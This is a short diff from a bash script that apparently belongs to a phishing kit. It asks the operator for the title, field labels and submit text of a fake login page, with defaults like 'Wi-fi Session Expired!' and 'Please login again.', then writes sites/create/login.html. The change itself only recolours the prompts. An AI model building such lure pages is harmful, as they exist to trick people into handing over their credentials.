@@ -177,19 +177,19 @@ default_user_text="Username:"
 default_pass_text="Password:"
 default_sub_text="Log-In"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 1 (Default: \e[1;77mWi-fi Session Expired!\e[1;92m): \e[0m' cap1
 cap1="${cap1:-${default_cap1}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 2 (Default: \e[1;77mPlease login again.\e[1;92m): \e[0m' cap2
 cap2="${cap2:-${default_cap2}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Username field (Default: \e[1;77mUsername:\e[1;92m): \e[0m' user_text
 user_text="${user_text:-${default_user_text}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Password field (Default: \e[1;77mPassword:\e[1;92m): \e[0m' pass_text
 pass_text="${pass_text:-${default_pass_text}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Submit field (Default: \e[1;77mLog-In\e[1;92m): \e[0m' sub_text
 sub_text="${sub_text:-${default_sub_text}}"
 
 echo "<!DOCTYPE html>" > sites/create/login.html
